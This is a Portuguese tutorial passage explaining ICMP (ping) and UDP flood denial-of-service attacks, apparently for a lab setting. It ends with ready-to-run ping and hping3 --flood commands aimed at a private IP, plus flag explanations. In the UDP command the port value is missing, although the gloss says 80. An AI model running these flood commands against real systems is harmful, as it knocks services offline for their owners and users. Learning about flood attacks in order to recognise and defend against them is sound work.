**2- ICMP e UDP Flood**

O ataque ICMP Flood, também conhecido como Ping Flood, e o UDP Flood são técnicas de DoS (Denial ie of Service ou Negação de serviço) que exploram o envio massivo de pacotes para sobrecarregar os recursos de um servidor e interromper suas operações.

O UDP envia pacotes de dados para o servidor, e, se a porta de destino estiver aberta, o servidor responde ao pacote recebido. Caso a porta esteja fechada, o servidor envia uma mensagem ICMP indicando a indisponibilidade da porta.

Ataques de flood tem o objetivo de realizar o esgotamento dos recursos do servidor mandando pacotes maiores e mais rapidamente.

Enviar um pacote grande quebrado em várias partes para quando o mesmo chegar no destino o servidor gastar muito processamento para reconstruir esse pacote.

É necessário que o hardware do atacante seja maior que o hardware do atacado, um ataque de “força bruta”.

Para esse ataque ser efetivo em um cenário real, botnets são utilizadas.

Facilmente de ser detectado.

**Entrando em prática**

    ping  192.168.200.7 -i 0.1 -s 6500

`-i é o intervalo entre os envios de pacote`

`0.1 é o tempo em segundos para o envio de cada ping`

`-s define o tamanho do pacote`

`6500 é o tamanho do pacote em bytes`

    sudo hping3 --icmptype 8 192.168.200.7 --flood --data 6500

`--icmptype 8: Envia pacotes ICMP do tipo Echo Request`

`192\.168.200.7: IP de destino (servidor)`

`--flood: Envia os pacotes continuamente para sobrecarregar o alvo`

`--data 6500: Tamanho do pacote em bytes`

    sudo hping3 --udp 192.168.200.7 --flood -p --data 6500

`--udp: Define o protocolo como UDP`

`192\.168.200.7: IP de destino (servidor)`

`--flood: Envia pacotes continuamente`

`-p 80: Porta de destino (geralmente usada para HTTP)`

`--data 6500: Tamanho do pacote em bytes`
